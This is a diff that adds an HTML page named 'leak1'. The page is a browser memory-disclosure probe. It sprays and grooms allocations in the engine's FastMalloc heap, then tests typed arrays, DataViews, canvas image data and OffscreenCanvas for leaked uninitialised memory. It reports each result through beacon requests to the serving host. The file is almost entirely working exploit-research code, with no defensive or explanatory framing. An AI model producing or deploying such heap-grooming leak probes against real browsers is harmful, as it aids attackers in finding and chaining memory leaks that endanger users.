@@ -1,0 +1,36 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>leak1</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function nz(a){var n=0,f=-1;for(var i=0;i<a.length;i++){if(a[i]){n++;if(f<0)f=i;}}return n+":"+f;}
+// churn the same FastMalloc classes the font path uses, so any reused cell is dirty
+function churn(){
+  var keep=[];
+  for(var i=0;i<4000;i++){ keep.push(new Array(176).join('L')); }
+  window.__keep=keep;
+}
+function tryAll(){
+  var out=[];
+  // 1 fresh typed arrays
+  var u8=new Uint8Array(256); out.push('u8='+nz(u8));
+  var f64=new Float64Array(64); out.push('f64='+nz(f64));
+  // 2 DataView over a fresh buffer
+  var dv=new DataView(new ArrayBuffer(256)); var d=[]; for(var i=0;i<256;i++)d.push(dv.getUint8(i)); out.push('dv='+nz(d));
+  // 3 canvas: fresh, never drawn
+  var c=document.createElement('canvas'); c.width=64; c.height=64; document.body.appendChild(c);
+  var ctx=c.getContext('2d');
+  out.push('canvasRaw='+nz(ctx.getImageData(0,0,64,64).data));
+  // 4 createImageData (uninitialized by spec in some engines)
+  out.push('created='+nz(ctx.createImageData(32,32).data));
+  // 5 canvas after a font flush
+  ctx.font='20px x'; ctx.fillText('AAAAAAAA',2,32);
+  out.push('drawn='+nz(ctx.getImageData(0,0,64,64).data));
+  // 6 ImageBitmap route
+  try{ var off=new OffscreenCanvas(16,16); var octx=off.getContext('2d'); out.push('offscreen='+nz(octx.getImageData(0,0,16,16).data)); }catch(e){ out.push('offscreen=err'); }
+  // 7 ArrayBuffer slice of a font-derived buffer is meaningless; instead check regexp scratch
+  return out.join(' ');
+}
+churn();
+b('L1-CHURNED');
+b('L1-RES-'+tryAll().replace(/ /g,'_'));
+b('L1-DONE');
+</script></head><body><p>leak1</p></body></html>
